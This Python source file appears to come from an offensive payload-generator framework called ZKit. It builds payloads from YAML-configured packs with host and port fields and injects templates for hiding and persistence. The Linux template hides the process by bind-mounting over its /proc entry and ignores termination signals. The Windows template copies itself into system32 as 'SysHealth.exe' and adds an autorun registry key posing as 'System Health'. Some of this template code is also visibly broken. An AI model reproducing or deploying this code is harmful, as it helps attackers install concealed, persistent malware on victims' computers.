import random
import sys
from importlib import import_module as imp
from os import path

import yaml

import core.lib._errors as _errors
from core import __version__ as version
from core.lib.randoms import random_str
PayloadConfigError = _errors.PayloadConfigError
BASIC_LEVEL = "basic"
APACHE_LICENSE = "Apache Software License 2.0"
CONFIG_FILE = "zkit.yml"
CONFIG_FILE_EX = "zkit.yaml"


REQUIRED_VARS = ("name", "version", "author", "description", "payloads")
OPTIONAL_VARS = {"license": APACHE_LICENSE, "required_version": version,
                 "homepage": "", "profile": "", "level": BASIC_LEVEL, 'fields' : ["host", "port"], 'fulldescription' : ""
                 }

ALL_VARS = [*REQUIRED_VARS, *tuple(OPTIONAL_VARS.keys())]

# i know DRY (dont repeat yourself) as a rule . but i got no choice the core.helper_core gets ready late . and i cant access it .
# its the nature of it . i cant change it . some modules get loaded by others and they cant access uppers
class Color:
    'ANSI Color codes'

    def __init__(self):
        self.colors = {
            "black": "\033[30m",
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "grey": "\033[37m",
            "reset": "\033[0m",
        }

    def GetColor(self, colorname):  # pylint: disable=C0103; # noqa
        'Gets a color from colors dict case insensetive'
        return self.colors.get(colorname.lower())

    def GetAllColors(self):  # pylint: disable=C0103; # noqa
        "returns all colors and reset as a tuple"
        return tuple(self.colors.values())

    def RandomColor(self):
        colors = [*self.GetAllColors()]
        gc = self.GetColor
        to_remove = ['grey', 'reset', 'black']
        for r in to_remove:
            colors.remove(gc(r))
        return random.choice(colors)


class PayloadGenerator:
    def __init__(self, root: str):
        self._LINUX_HIDER = """
import signal as s,subprocess
from random import choice as c
def {hide_process}():\n\tch = s.uppercase + s.digits
\ttoken = "".join(c(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, signal.SIG_IGN)\n\tsignal.signal(signal.SIGINT, signal.SIG_IGN)
{hide_process}()
        """
        self._WINDOWS_HIDER = """
from winreg import OpenKey , SetValueEx
def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\t\n\tff.close()
\tos.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
             "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{keepyourselfalive}()
        """
        self._IMPORTS = "import socket,os,sys\n"
        self.root = root
        if not self.root.endswith(('\\', "/")):
            self.root += "\\"
        self.CONFIG_FILE = path.abspath(self.root + CONFIG_FILE)
        self.CONFIG_FILE_EX = path.abspath(self.root + CONFIG_FILE_EX)
        self.info = self.load_info()
        self.validate(self.info)
        self.payloads = {}
        self.root.replace("/", "\\")
        for payload in self.info['payloads']:
            self.payloads[payload] = imp(
                "." + payload, self.root.replace(sys.path[0], '').replace('\\', '.')[1:-1])

    def load_info(self) -> dict:
        try:
            f = open(self.CONFIG_FILE)
        except FileNotFoundError:
            f = open(self.CONFIG_FILE_EX)
        info = yaml.full_load(f)
        f.close()
        return info
    def handle_version(self):
        if self.info['version'] > version:
            raise PayloadConfigError("This payload requires {} or upper but your zkit-framework version is {}".format(self.info['version'], version)
                                     , "Please consider upgrading your ZKit-Framework")
        

    def _check_for_odds(self, info):
        for i in info:
            if not (i in ALL_VARS):
                raise PayloadConfigError(
                    "{} Is not reconized by ZKit".format(i))
        return True

    def _check_for_requireds(self, info):
        for r in REQUIRED_VARS:
            if not (r in info):
                raise PayloadConfigError(
                    "{} Is required but NOT found".format(r))
        return True

    def _handle_levels(self, payload: str, level: str, platform: str):
        if level.lower() == "basic":
            # User wants zkit to handle hiding
            if platform.lower() == "windows":
                hider = self._WINDOWS_HIDER
            elif platform.lower() == "linux":
                hider = self._LINUX_HIDER
            else:
                print("The payload platform is not supported and level is basic .",
                      "if your payloads are for windows linux name them windows.py , linux.py",
                      "if you payloads platforms are not linux or windows please change level to advanced",
                      "If the payload is not yours . please report it to developer of it")
                hider = ""
            return self._IMPORTS + random.choice(["", "\n", "\n\n"]) + hider + payload + random.choice(["", "\n", "\n\n"])

    def get_random_strs(self, size=4, count=7):
        return [random_str(size) for _ in range(count)]

    def get_fields(self):
        return self.info['fields']

    def generate(self, data) -> str:
        "Generates the payload"
        info = self.info
        print("\n{} By {}\nDescription : {}\nplease write '-1' for more info".format(
            self.info['name'], info['author'], info['description']))
        if str(input("Or press enter : ")) == "-1":
            [print(Color().RandomColor() + "{} : {}".format(key, info[key]
                                                            ) + Color().GetColor('reset'), end="\n\n") for key in info]

        if len(self.payloads) >= 2:
            print("This Payload-Pack has {} diffrent payloads in it (usually for diffrent platform) ."
                  "They are : \n".format(len(self.payloads)))
            for index, key in enumerate(self.payloads):
                print(Color().RandomColor(
                ) + "{%s}--> %s\n" % (str(index + 1), key) + Color().GetColor('reset'))
            choice = str(input("Which Payload (Index of it) : "))
            payloads_list = list(self.payloads.keys())
            choice = payloads_list[int(choice) - 1]
        else:
            choice = list(self.payloads.keys())[0]

        strs = self.get_random_strs()
        payload = self.payloads[choice].Payload(*data, strs[1:]).create()
        payload = self._handle_levels(payload, info['level'], choice)

        # sweet now payload is generated . lets return the result
        return payload

    def validate(self, info):
        self._check_for_odds(info)
        self._check_for_requireds(info)
        _info = OPTIONAL_VARS
        # Let me explain it a bit . we have a dict of optional vars (OPTIONAL_VARS) with default values . we have checked 
        # for odds or a required var not defined . so we are sure about data we have . we iter through the user info keys
        # and overwrite anything that user have defined and what the user havent defined is untouched 
        for info in self.info:
            _info[info] = self.info[info]
        # replacing the dict that will be used with generated one
        self.info = _info
        return True
